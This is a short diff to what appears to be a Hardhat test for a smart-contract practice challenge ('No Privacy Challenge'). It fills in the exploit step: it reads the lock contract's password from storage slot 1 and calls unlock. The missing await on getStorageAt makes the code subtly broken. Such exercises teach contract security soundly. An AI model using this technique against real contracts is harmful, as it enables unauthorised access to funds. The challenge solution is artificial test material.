@@ -18,6 +18,9 @@ describe("No Privacy Challenge", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
+    // password is stored in contract bytecode memory storage 
+    let password = ethers.provider.getStorageAt(this.lock.address, 1);
+    await this.lock.unlock(password);
   });
 
   after(async function () {
